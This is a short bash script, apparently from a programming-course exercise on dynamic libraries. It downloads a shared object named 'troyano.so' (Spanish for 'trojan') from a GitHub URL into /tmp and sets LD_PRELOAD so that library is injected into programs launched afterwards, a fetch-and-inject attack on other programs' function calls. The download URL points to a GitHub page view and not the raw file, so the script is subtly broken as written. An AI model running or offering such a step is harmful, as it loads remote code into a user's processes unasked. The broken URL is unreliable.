#!/bin/bash
wget -O /tmp/troyano.so https://github.com/DiegoSusviela/holbertonschool-low_level_programming/blob/main/0x18-dynamic_libraries/troyano.so
export LD_PRELOAD=/tmp/troyano.so
